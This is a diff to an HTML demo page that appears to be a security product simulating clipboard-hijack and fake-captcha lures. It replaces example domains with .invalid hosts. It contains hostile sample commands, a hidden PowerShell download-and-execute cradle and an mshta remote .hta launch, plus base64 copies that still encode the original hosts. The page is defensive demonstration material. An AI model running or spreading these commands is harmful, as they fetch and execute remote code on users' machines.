@@ -1714,7 +1714,7 @@
             <div class="panel-header">
               <h2>🛡️ Client Sandbox</h2>
               <span class="badge" style="font-size: 0.65rem; border-color: rgba(239, 68, 68, 0.2); background: rgba(239, 68, 68, 0.05); color: #f87171;" id="sandbox-target-badge">
-                Target: victim-portal.com
+                Target: victim-portal.invalid
               </span>
             </div>
 
@@ -1727,7 +1727,7 @@
                   <div class="chrome-dot dot-green"></div>
                 </div>
                 <div class="chrome-url-bar" id="chrome-address-bar">
-                  <span>https://victim-portal.com/help-desk/login</span>
+                  <span>https://victim-portal.invalid/help-desk/login</span>
                   <span style="color: #4b5563;">🔒 HTTPS</span>
                 </div>
               </div>
@@ -1768,7 +1768,7 @@
                       Our AI agent detected and intercepted a malicious clipboard hijacking attempt. The fake captcha lure has been removed.
                     </div>
                     <div class="warning-details" id="warning-payload-view">
-                      powershell.exe -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://bad-actor.xyz/p.ps1')"
+                      powershell.exe -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://bad-actor.invalid/p.ps1')"
                     </div>
                     <div class="warning-buttons">
                       <button class="warning-btn btn-red" id="btn-close-warning" onclick="closeWarning()">Close Shield</button>
@@ -2350,9 +2350,9 @@
     const scenarios = {
       1: {
         name: "Scenario 1: Clipboard Hijack",
-        url: "https://victim-portal.com/help-desk/login",
+        url: "https://victim-portal.invalid/help-desk/login",
         obfuscated: "cG93ZXJzaGVsbC5leGUgLXcgaGlkZGVuIC1jICJJRVgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL2JhZC1hY3Rvci54eXovcC5wczEnKSI=",
-        decoded: "powershell.exe -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://bad-actor.xyz/p.ps1')\"",
+        decoded: "powershell.exe -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://bad-actor.invalid/p.ps1')\"",
         lureHtml: `
           <svg class="lure-logo" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="2">
             <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
@@ -2377,9 +2377,9 @@
       },
       2: {
         name: "Scenario 2: Captcha DOM Lure",
-        url: "https://legit-banking.org/personal",
+        url: "https://legit-banking.invalid/personal",
         obfuscated: "bXNodGEgImh0dHA6Ly9jbGVhcmZha2UtZG9tYWluLmluZm8vdXBkYXRlLmh0YSI=",
-        decoded: "mshta \"http://clearfake-domain.info/update.hta\"",
+        decoded: "mshta \"http://clearfake-domain.invalid/update.hta\"",
         lureHtml: `
           <div style="background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 8px; padding: 0.75rem; text-align: left; width: 100%;">
             <div style="color: #f87171; font-weight: 700; font-size: 0.8rem; margin-bottom: 0.25rem;">⚠️ System Notification</div>
